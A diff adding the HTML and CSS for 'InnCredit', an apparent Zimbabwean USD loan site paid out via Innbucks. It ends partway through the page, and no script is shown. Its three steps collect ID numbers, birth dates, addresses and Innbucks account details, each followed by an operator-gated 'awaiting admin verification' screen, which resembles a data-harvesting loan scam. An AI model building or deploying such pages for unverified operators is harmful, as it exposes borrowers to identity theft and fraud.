@@ -1,0 +1,1285 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>InnCredit – Zimbabwe USD Loans via Innbucks</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=Epilogue:wght@300;400;500;600&display=swap" rel="stylesheet"/>
+<style>
+:root{
+  --bg:#050a06;
+  --deep:#071009;
+  --panel:rgba(10,20,12,0.85);
+  --green:#1db954;
+  --green2:#00e64d;
+  --green-glow:rgba(29,185,84,0.18);
+  --gold:#f5c842;
+  --gold2:#ffe07a;
+  --gold-glow:rgba(245,200,66,0.15);
+  --white:#f0f7f1;
+  --gray:#6b8f72;
+  --border:rgba(29,185,84,0.15);
+  --border2:rgba(255,255,255,0.06);
+  --r:16px;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:'Epilogue',sans-serif;
+  background:var(--bg);
+  color:var(--white);
+  min-height:100vh;
+  overflow-x:hidden;
+}
+
+/* ══ PAGE SYSTEM ══ */
+.page{display:none;min-height:100vh;}
+.page.active{display:block;}
+
+/* ══════════════════════════════════════
+   PAGE 1 — COVER
+══════════════════════════════════════ */
+.cover{
+  min-height:100vh;
+  display:flex;flex-direction:column;
+  align-items:center;justify-content:center;
+  padding:48px 20px 64px;
+  position:relative;overflow:hidden;
+}
+
+/* layered background */
+.cover::before{
+  content:'';position:absolute;inset:0;
+  background:
+    radial-gradient(ellipse 90% 70% at 15% 5%,rgba(29,185,84,0.13) 0%,transparent 55%),
+    radial-gradient(ellipse 60% 90% at 88% 90%,rgba(245,200,66,0.07) 0%,transparent 55%),
+    radial-gradient(ellipse 70% 50% at 50% 50%,rgba(0,230,77,0.04) 0%,transparent 70%),
+    linear-gradient(175deg,#050f06 0%,#061209 35%,#030804 100%);
+  z-index:0;
+}
+
+/* diagonal gold accent stripe */
+.cover::after{
+  content:'';position:absolute;
+  top:-200px;right:-200px;
+  width:600px;height:600px;
+  border:1px solid rgba(245,200,66,0.07);
+  border-radius:50%;
+  z-index:0;
+  animation:rotateRing 30s linear infinite;
+}
+
+@keyframes rotateRing{to{transform:rotate(360deg);}}
+
+/* dot grid */
+.dot-grid{
+  position:absolute;inset:0;z-index:0;
+  background-image:radial-gradient(circle, rgba(29,185,84,0.12) 1px, transparent 1px);
+  background-size:40px 40px;
+  mask-image:radial-gradient(ellipse 80% 80% at 50% 50%,black 30%,transparent 100%);
+}
+
+/* glowing blobs */
+.blob{position:absolute;border-radius:50%;filter:blur(80px);z-index:0;pointer-events:none;}
+.blob1{width:350px;height:350px;background:rgba(29,185,84,0.07);top:-60px;left:-100px;animation:blobDrift 10s ease-in-out infinite;}
+.blob2{width:250px;height:250px;background:rgba(245,200,66,0.05);bottom:80px;right:-60px;animation:blobDrift 13s ease-in-out infinite reverse;}
+@keyframes blobDrift{0%,100%{transform:translate(0,0);}50%{transform:translate(30px,-30px);}}
+
+.cover-inner{
+  position:relative;z-index:1;
+  display:flex;flex-direction:column;align-items:center;
+  width:100%;max-width:480px;
+}
+
+/* ── LOGO ── */
+.brand{
+  display:flex;align-items:center;gap:14px;
+  margin-bottom:52px;
+  animation:riseUp .7s cubic-bezier(.16,1,.3,1) both;
+}
+.brand-mark{
+  width:56px;height:56px;border-radius:14px;
+  background:linear-gradient(135deg,var(--green),var(--green2));
+  display:flex;align-items:center;justify-content:center;
+  font-family:'Syne',sans-serif;font-size:26px;font-weight:800;
+  color:#050a06;letter-spacing:-1px;
+  box-shadow:0 0 32px rgba(29,185,84,0.5),0 4px 20px rgba(0,0,0,0.5);
+  position:relative;
+}
+.brand-mark::after{
+  content:'';position:absolute;inset:-3px;border-radius:17px;
+  background:linear-gradient(135deg,rgba(0,230,77,0.5),transparent 60%);
+  z-index:-1;
+}
+.brand-info{}
+.brand-name{
+  font-family:'Syne',sans-serif;font-size:28px;font-weight:800;
+  letter-spacing:-0.5px;line-height:1;
+  color:var(--white);
+}
+.brand-name em{color:var(--green);font-style:normal;}
+.brand-tag{
+  font-size:11px;letter-spacing:2px;text-transform:uppercase;
+  color:var(--gray);margin-top:3px;
+}
+
+/* ── PILL TAG ── */
+.pill{
+  display:inline-flex;align-items:center;gap:8px;
+  background:rgba(29,185,84,0.1);
+  border:1px solid rgba(29,185,84,0.25);
+  color:var(--green);padding:7px 18px;border-radius:30px;
+  font-size:11px;font-weight:600;letter-spacing:1.5px;text-transform:uppercase;
+  margin-bottom:24px;
+  animation:riseUp .7s cubic-bezier(.16,1,.3,1) .08s both;
+}
+.pill-dot{
+  width:6px;height:6px;border-radius:50%;
+  background:var(--green);animation:blink 2s ease infinite;
+}
+
+/* ── HEADLINE ── */
+.headline{
+  font-family:'Syne',sans-serif;
+  font-size:clamp(42px,9vw,72px);
+  font-weight:800;line-height:.95;
+  text-align:center;margin-bottom:18px;
+  letter-spacing:-2px;
+  animation:riseUp .7s cubic-bezier(.16,1,.3,1) .14s both;
+}
+.headline .w1{display:block;color:var(--white);}
+.headline .w2{
+  display:block;color:var(--green);
+  text-shadow:0 0 60px rgba(29,185,84,0.5);
+}
+.headline .w3{
+  display:block;
+  font-size:.45em;font-weight:600;letter-spacing:3px;
+  text-transform:uppercase;color:var(--gold);
+  margin-top:10px;
+}
+
+.subline{
+  font-size:15px;color:rgba(240,247,241,0.55);
+  text-align:center;max-width:360px;line-height:1.8;
+  margin-bottom:44px;
+  animation:riseUp .7s cubic-bezier(.16,1,.3,1) .2s both;
+}
+
+/* ── GLASS CARD ── */
+.glass{
+  width:100%;
+  background:rgba(8,18,10,0.75);
+  border:1px solid var(--border);
+  border-radius:22px;padding:34px 30px;
+  backdrop-filter:blur(24px);
+  box-shadow:
+    0 0 0 1px rgba(255,255,255,0.03),
+    0 24px 60px rgba(0,0,0,0.6),
+    inset 0 1px 0 rgba(29,185,84,0.08);
+  animation:riseUp .7s cubic-bezier(.16,1,.3,1) .26s both;
+}
+@media(max-width:460px){.glass{padding:26px 18px;}}
+
+.card-step{
+  font-size:10px;font-weight:700;color:var(--green);
+  text-transform:uppercase;letter-spacing:2.5px;
+  display:flex;align-items:center;gap:8px;
+  margin-bottom:22px;
+}
+.card-step::before{content:'';width:20px;height:1px;background:var(--green);}
+.card-step::after{content:'';flex:1;height:1px;background:rgba(29,185,84,0.2);}
+
+/* ── INPUTS ── */
+.row2{display:grid;grid-template-columns:1fr 1fr;gap:14px;}
+@media(max-width:440px){.row2{grid-template-columns:1fr;}}
+
+.fld{margin-bottom:16px;}
+.fld-lbl{
+  font-size:11px;font-weight:600;color:rgba(240,247,241,0.55);
+  letter-spacing:.8px;text-transform:uppercase;
+  margin-bottom:8px;display:flex;align-items:center;gap:5px;
+}
+.fld-lbl .ast{color:var(--green);}
+
+.inp-wrap{position:relative;}
+.inp-ico{
+  position:absolute;left:14px;top:50%;transform:translateY(-50%);
+  font-size:15px;pointer-events:none;z-index:1;
+}
+.inp{
+  width:100%;padding:13px 14px 13px 42px;
+  background:rgba(255,255,255,0.03);
+  border:1.5px solid rgba(255,255,255,0.08);
+  border-radius:11px;
+  font-family:'Epilogue',sans-serif;font-size:14px;
+  color:var(--white);outline:none;
+  transition:border-color .2s,background .2s,box-shadow .2s;
+}
+.inp.no-ico{padding-left:14px;}
+.inp::placeholder{color:rgba(255,255,255,0.2);}
+.inp:focus{
+  border-color:var(--green);
+  background:rgba(29,185,84,0.05);
+  box-shadow:0 0 0 3px rgba(29,185,84,0.1);
+}
+select.inp{
+  cursor:pointer;appearance:none;
+  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='11' height='7'%3E%3Cpath d='M1 1l4.5 4.5L10 1' stroke='%231db954' stroke-width='1.5' fill='none' stroke-linecap='round'/%3E%3C/svg%3E");
+  background-repeat:no-repeat;background-position:right 14px center;padding-right:38px;
+}
+select.inp option{background:#071009;color:var(--white);}
+textarea.inp{padding-left:14px;resize:vertical;min-height:80px;padding-top:13px;}
+
+.usd-badge{
+  position:absolute;right:12px;top:50%;transform:translateY(-50%);
+  font-size:11px;font-weight:700;color:var(--gold);
+  background:rgba(245,200,66,0.1);border:1px solid rgba(245,200,66,0.2);
+  padding:2px 7px;border-radius:5px;pointer-events:none;
+}
+
+.f-err{
+  display:none;font-size:12px;color:#ff6b6b;
+  background:rgba(255,107,107,0.08);border:1px solid rgba(255,107,107,0.2);
+  border-radius:8px;padding:9px 13px;margin-top:8px;line-height:1.5;
+}
+
+/* ── BUTTON ── */
+.go-btn{
+  width:100%;padding:16px;margin-top:8px;
+  background:linear-gradient(135deg,var(--green) 0%,var(--green2) 100%);
+  color:#050a06;border:none;border-radius:12px;
+  font-family:'Syne',sans-serif;font-size:15px;font-weight:700;
+  cursor:pointer;letter-spacing:.3px;
+  display:flex;align-items:center;justify-content:center;gap:10px;
+  transition:transform .15s,box-shadow .2s;
+  box-shadow:0 4px 24px rgba(29,185,84,0.35);
+  position:relative;overflow:hidden;
+}
+.go-btn::before{
+  content:'';position:absolute;inset:0;
+  background:linear-gradient(135deg,rgba(255,255,255,0.18),transparent);
+  opacity:0;transition:opacity .2s;
+}
+.go-btn:hover{transform:translateY(-2px);box-shadow:0 8px 32px rgba(29,185,84,0.5);}
+.go-btn:hover::before{opacity:1;}
+.go-btn:active{transform:translateY(0);}
+.go-btn:disabled{opacity:.6;cursor:not-allowed;transform:none;}
+.go-arr{font-size:18px;transition:transform .2s;}
+.go-btn:hover .go-arr{transform:translateX(4px);}
+
+.spin{
+  width:17px;height:17px;
+  border:2px solid rgba(5,10,6,0.3);border-top-color:#050a06;
+  border-radius:50%;animation:spin .7s linear infinite;display:none;
+}
+
+/* ── STATS ROW ── */
+.stats{
+  display:flex;gap:0;width:100%;margin-top:36px;
+  border:1px solid rgba(255,255,255,0.06);border-radius:14px;overflow:hidden;
+  animation:riseUp .7s cubic-bezier(.16,1,.3,1) .38s both;
+}
+.stat{
+  flex:1;padding:16px 10px;text-align:center;
+  background:rgba(255,255,255,0.02);
+  border-right:1px solid rgba(255,255,255,0.05);
+}
+.stat:last-child{border-right:none;}
+.stat-v{
+  font-family:'Syne',sans-serif;font-size:20px;font-weight:800;
+  color:var(--green);display:block;letter-spacing:-0.5px;
+}
+.stat-l{font-size:10px;color:var(--gray);text-transform:uppercase;letter-spacing:.5px;}
+
+/* ── TRUST ── */
+.trust{
+  display:flex;flex-wrap:wrap;justify-content:center;gap:16px;
+  margin-top:28px;
+  animation:riseUp .7s cubic-bezier(.16,1,.3,1) .44s both;
+}
+.trust-i{
+  display:flex;align-items:center;gap:6px;
+  font-size:12px;color:rgba(240,247,241,0.4);font-weight:500;
+}
+.trust-i::before{content:'✓';color:var(--green);font-weight:700;}
+
+/* ══════════════════════════════════════
+   PAGES 2 & 3 — APP SHELL
+══════════════════════════════════════ */
+.shell{
+  min-height:100vh;
+  background:linear-gradient(160deg,#040904 0%,#071209 50%,#040804 100%);
+  position:relative;
+}
+.shell::before{
+  content:'';position:absolute;top:0;left:0;right:0;height:300px;
+  background:radial-gradient(ellipse 70% 100% at 30% -10%,rgba(29,185,84,0.07) 0%,transparent 65%);
+  pointer-events:none;
+}
+
+/* TOP NAV */
+.nav{
+  position:sticky;top:0;z-index:100;
+  background:rgba(4,9,4,0.9);backdrop-filter:blur(20px);
+  border-bottom:1px solid var(--border2);
+  padding:0 28px;
+  display:flex;align-items:center;justify-content:space-between;
+  height:62px;
+}
+.nav-brand{display:flex;align-items:center;gap:10px;}
+.nav-mark{
+  width:32px;height:32px;border-radius:8px;
+  background:linear-gradient(135deg,var(--green),var(--green2));
+  display:flex;align-items:center;justify-content:center;
+  font-family:'Syne',sans-serif;font-size:15px;font-weight:800;color:#050a06;
+}
+.nav-name{font-family:'Syne',sans-serif;font-size:18px;font-weight:800;color:var(--white);}
+.nav-name em{color:var(--green);font-style:normal;}
+.back-btn{
+  display:flex;align-items:center;gap:6px;
+  background:rgba(255,255,255,0.05);border:1px solid var(--border2);
+  color:var(--gray);font-family:'Epilogue',sans-serif;font-size:13px;font-weight:500;
+  padding:7px 14px;border-radius:20px;cursor:pointer;
+  transition:all .2s;
+}
+.back-btn:hover{background:rgba(255,255,255,0.09);color:var(--white);}
+
+/* STEPPER */
+.stepper{
+  display:flex;align-items:center;
+  max-width:460px;margin:0 auto;padding:18px 28px;
+}
+.s-node{display:flex;align-items:center;gap:0;flex:1;}
+.s-circle{
+  width:30px;height:30px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-family:'Syne',sans-serif;font-size:12px;font-weight:700;
+  flex-shrink:0;transition:all .3s;
+}
+.s-circle.done{background:var(--green);color:#050a06;}
+.s-circle.active{
+  background:rgba(29,185,84,0.15);
+  border:2px solid var(--green);color:var(--green);
+}
+.s-circle.future{
+  background:rgba(255,255,255,0.04);
+  border:2px solid rgba(255,255,255,0.1);color:var(--gray);
+}
+.s-line{flex:1;height:2px;background:rgba(255,255,255,0.07);}
+.s-line.done{background:var(--green);}
+
+/* CONTENT AREA */
+.content{max-width:660px;margin:0 auto;padding:28px 20px 80px;}
+
+/* SECTION HEAD */
+.sec-tag{
+  font-size:10px;font-weight:700;color:var(--green);
+  text-transform:uppercase;letter-spacing:2.5px;
+  display:flex;align-items:center;gap:8px;margin-bottom:10px;
+}
+.sec-tag::before{content:'';width:14px;height:1px;background:var(--green);}
+.sec-h{
+  font-family:'Syne',sans-serif;
+  font-size:clamp(26px,5vw,34px);font-weight:800;
+  letter-spacing:-1px;line-height:1.1;margin-bottom:8px;
+}
+.sec-h em{color:var(--green);font-style:normal;}
+.sec-desc{font-size:14px;color:var(--gray);line-height:1.7;margin-bottom:28px;}
+
+/* FORM PANEL */
+.panel{
+  background:rgba(8,18,10,0.7);
+  border:1px solid var(--border2);
+  border-radius:20px;padding:30px;
+  backdrop-filter:blur(12px);
+  box-shadow:0 20px 60px rgba(0,0,0,0.35);
+}
+@media(max-width:460px){.panel{padding:20px 14px;}}
+
+.grp-title{
+  font-size:10px;font-weight:700;color:rgba(29,185,84,0.7);
+  text-transform:uppercase;letter-spacing:2px;
+  margin:22px 0 13px;padding-bottom:8px;
+  border-bottom:1px solid rgba(255,255,255,0.05);
+}
+.grp-title:first-child{margin-top:0;}
+
+/* INNBUCKS BADGE */
+.inn-badge{
+  display:inline-flex;align-items:center;gap:8px;
+  background:rgba(245,200,66,0.08);
+  border:1px solid rgba(245,200,66,0.2);
+  color:var(--gold);
+  padding:7px 15px;border-radius:8px;
+  font-size:12px;font-weight:600;letter-spacing:.5px;
+  margin-bottom:18px;
+}
+
+/* ══ PENDING / RESULT SCREENS ══ */
+.ov{display:none;text-align:center;padding:50px 20px;}
+.ov.show{display:block;}
+
+.ov-icon{
+  width:76px;height:76px;border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-size:34px;margin:0 auto 20px;
+}
+.ov-icon.wait{
+  background:rgba(29,185,84,0.1);border:2px solid rgba(29,185,84,0.25);
+  animation:pulseIcon 2.2s ease infinite;
+}
+.ov-icon.ok{background:rgba(29,185,84,0.12);}
+.ov-icon.no{background:rgba(255,107,107,0.1);}
+
+.ov-h{
+  font-family:'Syne',sans-serif;font-size:26px;font-weight:800;
+  letter-spacing:-0.5px;margin-bottom:10px;
+}
+.ov-h.g{color:var(--green);}
+.ov-h.r{color:#ff6060;}
+.ov-p{font-size:14px;color:var(--gray);line-height:1.8;max-width:340px;margin:0 auto 20px;}
+
+.ref-block{
+  display:inline-block;
+  background:rgba(29,185,84,0.08);border:1px solid rgba(29,185,84,0.25);
+  border-radius:10px;padding:12px 24px;
+  font-family:'Syne',sans-serif;font-size:22px;font-weight:800;
+  color:var(--green);letter-spacing:3px;margin-bottom:8px;
+}
+.dot-row{
+  display:flex;align-items:center;justify-content:center;gap:8px;
+  font-size:12px;color:var(--gray);margin-top:10px;
+}
+.d{width:7px;height:7px;border-radius:50%;background:var(--green);animation:blink 1.5s ease infinite;}
+
+.res-box{
+  background:rgba(255,255,255,0.03);border:1px solid var(--border2);
+  border-radius:12px;padding:16px 18px;
+  text-align:left;margin:16px 0;font-size:14px;line-height:2.1;
+}
+.res-box strong{color:var(--white);}
+
+.reset-btn{
+  padding:11px 26px;border-radius:10px;
+  border:1px solid rgba(29,185,84,0.35);
+  background:rgba(29,185,84,0.07);
+  color:var(--green);font-family:'Epilogue',sans-serif;
+  font-size:13px;font-weight:600;cursor:pointer;transition:all .2s;
+}
+.reset-btn:hover{background:rgba(29,185,84,0.14);}
+
+/* ANIMATIONS */
+@keyframes riseUp{from{opacity:0;transform:translateY(28px);}to{opacity:1;transform:translateY(0);}}
+@keyframes spin{to{transform:rotate(360deg);}}
+@keyframes blink{0%,100%{opacity:1;}50%{opacity:.2;}}
+@keyframes pulseIcon{0%,100%{transform:scale(1);box-shadow:0 0 0 0 rgba(29,185,84,.3);}50%{transform:scale(1.05);box-shadow:0 0 0 14px rgba(29,185,84,0);}}
+
+@media(max-width:580px){
+  .nav{padding:0 14px;}
+  .stepper{padding:14px;}
+  .content{padding:22px 14px 80px;}
+}
+</style>
+</head>
+<body>
+
+<!-- ══════════════════════════════════════════════
+     PAGE 1 — COVER · Full Name + Email
+══════════════════════════════════════════════ -->
+<div class="page active" id="pg1">
+<div class="cover">
+  <div class="dot-grid"></div>
+  <div class="blob blob1"></div>
+  <div class="blob blob2"></div>
+
+  <div class="cover-inner">
+
+    <!-- LOGO -->
+    <div class="brand">
+      <div class="brand-mark">IC</div>
+      <div class="brand-info">
+        <div class="brand-name">Inn<em>Credit</em></div>
+        <div class="brand-tag">Zimbabwe · Innbucks USD Loans</div>
+      </div>
+    </div>
+
+    <div class="pill"><span class="pill-dot"></span>🇿🇼 Zimbabwe's Fastest USD Loan</div>
+
+    <h1 class="headline">
+      <span class="w1">Instant Cash</span>
+      <span class="w2">In USD</span>
+      <span class="w3">Disbursed via Innbucks</span>
+    </h1>
+
+    <p class="subline">Apply in 3 minutes. Get approved fast. Funds sent directly to your Innbucks account in US Dollars.</p>
+
+    <!-- FORM CARD -->
+    <div class="glass">
+      <div class="card-step">Step 1 of 3 — Your Identity</div>
+
+      <div class="row2">
+        <div class="fld">
+          <div class="fld-lbl">First Name <span class="ast">*</span></div>
+          <div class="inp-wrap">
+            <span class="inp-ico">👤</span>
+            <input class="inp" type="text" id="p1_first" placeholder="e.g. Tatenda" required/>
+          </div>
+        </div>
+        <div class="fld">
+          <div class="fld-lbl">Last Name <span class="ast">*</span></div>
+          <div class="inp-wrap">
+            <span class="inp-ico">👤</span>
+            <input class="inp" type="text" id="p1_last" placeholder="e.g. Moyo" required/>
+          </div>
+        </div>
+      </div>
+
+      <div class="fld">
+        <div class="fld-lbl">Email Address <span class="ast">*</span></div>
+        <div class="inp-wrap">
+          <span class="inp-ico">✉️</span>
+          <input class="inp" type="email" id="p1_email" placeholder="e.g. tatenda.moyo@gmail.com" required/>
+        </div>
+      </div>
+
+      <div class="fld">
+        <div class="fld-lbl">City / Town <span class="ast">*</span></div>
+        <div class="inp-wrap">
+          <span class="inp-ico">📍</span>
+          <input class="inp" type="text" id="p1_city" placeholder="e.g. Harare, Bulawayo, Mutare" required/>
+        </div>
+      </div>
+
+      <div class="f-err" id="p1_err">⚠️ Please complete all fields correctly before continuing.</div>
+
+      <button class="go-btn" id="p1_btn" onclick="page1Submit()">
+        <span id="p1_txt">Continue to Step 2</span>
+        <div class="spin" id="p1_spin"></div>
+        <span class="go-arr" id="p1_arr">→</span>
+      </button>
+    </div>
+
+    <!-- STATS -->
+    <div class="stats">
+      <div class="stat"><span class="stat-v">$50</span><span class="stat-l">Min Loan</span></div>
+      <div class="stat"><span class="stat-v">$5K</span><span class="stat-l">Max Loan</span></div>
+      <div class="stat"><span class="stat-v">24hr</span><span class="stat-l">Decision</span></div>
+      <div class="stat"><span class="stat-v">USD</span><span class="stat-l">Currency</span></div>
+    </div>
+
+    <div class="trust">
+      <div class="trust-i">No Hidden Fees</div>
+      <div class="trust-i">Innbucks Disbursement</div>
+      <div class="trust-i">Secure &amp; Private</div>
+      <div class="trust-i">Fast Approval</div>
+    </div>
+
+  </div>
+</div>
+
+<!-- P1 WAITING SCREEN -->
+<div id="p1_wait" style="display:none;">
+  <div class="shell">
+    <div class="nav">
+      <div class="nav-brand"><div class="nav-mark">IC</div><div class="nav-name">Inn<em>Credit</em></div></div>
+    </div>
+    <div class="content">
+      <div class="ov show">
+        <div class="ov-icon wait">⏳</div>
+        <div class="ov-h" style="color:var(--white);">Details Submitted</div>
+        <p class="ov-p">Your personal details are being verified by our team. Please keep this page open.</p>
+        <div class="ref-block" id="p1_ref">IC-000000</div>
+        <p style="font-size:12px;color:var(--gray);margin-top:6px;">Your reference number — save this</p>
+        <div class="dot-row"><div class="d"></div>Awaiting admin verification…</div>
+      </div>
+    </div>
+  </div>
+</div>
+</div>
+
+
+<!-- ══════════════════════════════════════════════
+     PAGE 2 — Phone · ID Number · Date of Birth
+══════════════════════════════════════════════ -->
+<div class="page" id="pg2">
+<div class="shell">
+  <div class="nav">
+    <div class="nav-brand"><div class="nav-mark">IC</div><div class="nav-name">Inn<em>Credit</em> Zimbabwe</div></div>
+    <button class="back-btn" onclick="goBack(1)">← Back</button>
+  </div>
+
+  <!-- STEPPER -->
+  <div class="stepper">
+    <div class="s-node"><div class="s-circle done">✓</div><div class="s-line done"></div></div>
+    <div class="s-node"><div class="s-circle active">2</div><div class="s-line future"></div></div>
+    <div class="s-node" style="flex:0;"><div class="s-circle future">3</div></div>
+  </div>
+
+  <div class="content">
+
+    <!-- FORM -->
+    <div id="p2_form">
+      <div class="sec-tag">Step 2 of 3</div>
+      <h2 class="sec-h">Identity &amp; <em>Contact</em></h2>
+      <p class="sec-desc">Your phone number must be linked to your Innbucks account for disbursement.</p>
+
+      <div class="panel">
+        <div class="inn-badge">📱 Innbucks Zimbabwe</div>
+
+        <div class="grp-title">Contact Details</div>
+
+        <div class="fld">
+          <div class="fld-lbl">Innbucks Phone Number <span class="ast">*</span></div>
+          <div class="inp-wrap">
+            <span class="inp-ico">📱</span>
+            <input class="inp" type="tel" id="p2_phone" placeholder="+263 77 000 0000" required/>
+          </div>
+        </div>
+
+        <div class="fld">
+          <div class="fld-lbl">Alternative Phone (optional)</div>
+          <div class="inp-wrap">
+            <span class="inp-ico">📞</span>
+            <input class="inp" type="tel" id="p2_altph" placeholder="+263 71 000 0000"/>
+          </div>
+        </div>
+
+        <div class="grp-title">Identity Verification</div>
+
+        <div class="row2">
+          <div class="fld">
+            <div class="fld-lbl">ID Type <span class="ast">*</span></div>
+            <select class="inp no-ico" id="p2_idtype" required>
+              <option value="" disabled selected>Select ID type</option>
+              <option>National ID</option>
+              <option>Passport</option>
+              <option>Drivers Licence</option>
+            </select>
+          </div>
+          <div class="fld">
+            <div class="fld-lbl">ID Number <span class="ast">*</span></div>
+            <div class="inp-wrap">
+              <span class="inp-ico">🪪</span>
+              <input class="inp" type="text" id="p2_idnum" placeholder="e.g. 63-123456A78" required/>
+            </div>
+          </div>
+        </div>
+
+        <div class="row2">
+          <div class="fld">
+            <div class="fld-lbl">Date of Birth <span class="ast">*</span></div>
+            <div class="inp-wrap">
+              <span class="inp-ico">🎂</span>
+              <input class="inp" type="date" id="p2_dob" required/>
+            </div>
+          </div>
+          <div class="fld">
+            <div class="fld-lbl">Gender <span class="ast">*</span></div>
+            <select class="inp no-ico" id="p2_gender" required>
+              <option value="" disabled selected>Select gender</option>
+              <option>Male</option>
+              <option>Female</option>
+              <option>Prefer not to say</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="grp-title">Residential Address</div>
+
+        <div class="fld">
+          <div class="fld-lbl">Home Address <span class="ast">*</span></div>
+          <div class="inp-wrap">
+            <span class="inp-ico">🏠</span>
+            <input class="inp" type="text" id="p2_addr" placeholder="e.g. 12 Samora Machel Ave, Harare" required/>
+          </div>
+        </div>
+
+        <div class="f-err" id="p2_err">⚠️ Please fill in all required fields correctly.</div>
+
+        <button class="go-btn" id="p2_btn" onclick="page2Submit()">
+          <span id="p2_txt">Continue to Loan Details</span>
+          <div class="spin" id="p2_spin"></div>
+          <span class="go-arr" id="p2_arr">→</span>
+        </button>
+      </div>
+    </div>
+
+    <!-- P2 WAITING -->
+    <div class="ov" id="p2_wait">
+      <div class="ov-icon wait">⏳</div>
+      <div class="ov-h" style="color:var(--white);">Identity Submitted</div>
+      <p class="ov-p">Your identity is being verified. Hang tight — we'll update this page automatically.</p>
+      <div class="ref-block" id="p2_ref">IC-000000</div>
+      <div class="dot-row"><div class="d"></div>Awaiting admin verification…</div>
+    </div>
+
+  </div>
+</div>
+</div>
+
+
+<!-- ══════════════════════════════════════════════
+     PAGE 3 — Loan Amount · Period · Innbucks
+══════════════════════════════════════════════ -->
+<div class="page" id="pg3">
+<div class="shell">
+  <div class="nav">
+    <div class="nav-brand"><div class="nav-mark">IC</div><div class="nav-name">Inn<em>Credit</em> Zimbabwe</div></div>
+    <button class="back-btn" onclick="goBack(2)">← Back</button>
+  </div>
+
+  <!-- STEPPER -->
+  <div class="stepper">
+    <div class="s-node"><div class="s-circle done">✓</div><div class="s-line done"></div></div>
+    <div class="s-node"><div class="s-circle done">✓</div><div class="s-line done"></div></div>
+    <div class="s-node" style="flex:0;"><div class="s-circle active">3</div></div>
+  </div>
+
+  <div class="content">
+
+    <!-- FORM -->
+    <div id="p3_form">
+      <div class="sec-tag">Step 3 of 3 — Final Step</div>
+      <h2 class="sec-h">Loan <em>Details</em></h2>
+      <p class="sec-desc">Tell us what you need. All amounts are in US Dollars (USD), disbursed via Innbucks.</p>
+
+      <div class="panel">
+        <div class="inn-badge">💵 All Amounts in USD · Via Innbucks</div>
+
+        <div class="grp-title">Loan Requirements</div>
+
+        <div class="row2">
+          <div class="fld">
+            <div class="fld-lbl">Loan Amount (USD) <span class="ast">*</span></div>
+            <div class="inp-wrap">
+              <span class="inp-ico">💵</span>
+              <input class="inp" type="number" id="p3_amt" placeholder="e.g. 300" min="50" max="5000" required/>
+              <span class="usd-badge">USD</span>
+            </div>
+          </div>
+          <div class="fld">
+            <div class="fld-lbl">Loan Type <span class="ast">*</span></div>
+            <select class="inp no-ico" id="p3_type" required>
+              <option value="" disabled selected>Select type</option>
+              <option>Personal Loan</option>
+              <option>Business Loan</option>
+              <option>Emergency Loan</option>
+              <option>School Fees Loan</option>
+              <option>Medical Loan</option>
+              <option>Salary Advance</option>
+              <option>Grocery / Food Loan</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="row2">
+          <div class="fld">
+            <div class="fld-lbl">Repayment Period <span class="ast">*</span></div>
+            <select class="inp no-ico" id="p3_period" required>
+              <option value="" disabled selected>Select period</option>
+              <option>1 Month</option>
+              <option>2 Months</option>
+              <option>3 Months</option>
+              <option>6 Months</option>
+              <option>12 Months</option>
+              <option>24 Months</option>
+            </select>
+          </div>
+          <div class="fld">
+            <div class="fld-lbl">Purpose of Loan <span class="ast">*</span></div>
+            <select class="inp no-ico" id="p3_purpose" required>
+              <option value="" disabled selected>Select purpose</option>
+              <option>Medical Expenses</option>
+              <option>School Fees</option>
+              <option>Business Capital</option>
+              <option>Home Improvement</option>
+              <option>Groceries / Food</option>
+              <option>Funeral Expenses</option>
+              <option>Travel</option>
+              <option>Debt Repayment</option>
+              <option>Other</option>
+            </select>
+          </div>
+        </div>
+
+        <div class="grp-title">Employment &amp; Income</div>
+
+        <div class="row2">
+          <div class="fld">
+            <div class="fld-lbl">Employment Status <span class="ast">*</span></div>
+            <select class="inp no-ico" id="p3_employ" required>
+              <option value="" disabled selected>Select status</option>
+              <option>Employed (Formal Sector)</option>
+              <option>Self-Employed / Business</option>
+              <option>Government Employee</option>
+              <option>Informal Trader</option>
+              <option>Retired / Pensioner</option>
+              <option>Student</option>
+              <option>Unemployed</option>
+            </select>
+          </div>
+          <div class="fld">
+            <div class="fld-lbl">Monthly Income (USD) <span class="ast">*</span></div>
+            <div class="inp-wrap">
+              <span class="inp-ico">💰</span>
+              <input class="inp" type="number" id="p3_income" placeholder="e.g. 350" required/>
+              <span class="usd-badge">USD</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="fld">
+          <div class="fld-lbl">Employer / Business Name</div>
+          <div class="inp-wrap">
+            <span class="inp-ico">🏢</span>
+            <input class="inp" type="text" id="p3_employer" placeholder="e.g. TelOne Zimbabwe (optional)"/>
+          </div>
+        </div>
+
+        <div class="grp-title">Innbucks Disbursement</div>
+
+        <div class="fld">
+          <div class="fld-lbl">Innbucks Account Number <span class="ast">*</span></div>
+          <div class="inp-wrap">
+            <span class="inp-ico">📲</span>
+            <input class="inp" type="tel" id="p3_innbucks" placeholder="+263 77 000 0000 or Account ID" required/>
+          </div>
+        </div>
+
+        <div class="fld">
+          <div class="fld-lbl">Innbucks Account Name <span class="ast">*</span></div>
+          <div class="inp-wrap">
+            <span class="inp-ico">🏦</span>
+            <input class="inp" type="text" id="p3_accname" placeholder="Name on Innbucks account" required/>
+          </div>
+        </div>
+
+        <div class="fld">
+          <div class="fld-lbl">Additional Notes</div>
+          <textarea class="inp no-ico" id="p3_notes" placeholder="Anything else you'd like us to know..."></textarea>
+        </div>
+
+        <div class="f-err" id="p3_err">⚠️ Please complete all required fields.</div>
+
+        <button class="go-btn" id="p3_btn" onclick="page3Submit()">
+          <span id="p3_txt">Submit Final Application →</span>
+          <div class="spin" id="p3_spin"></div>
+        </button>
+      </div>
+    </div>
+
+    <!-- P3 WAITING -->
+    <div class="ov" id="p3_wait">
+      <div class="ov-icon wait">⏳</div>
+      <div class="ov-h" style="color:var(--white);">Application Submitted!</div>
+      <p class="ov-p">Your full application is under review. This page will update the moment a decision is made — keep it open.</p>
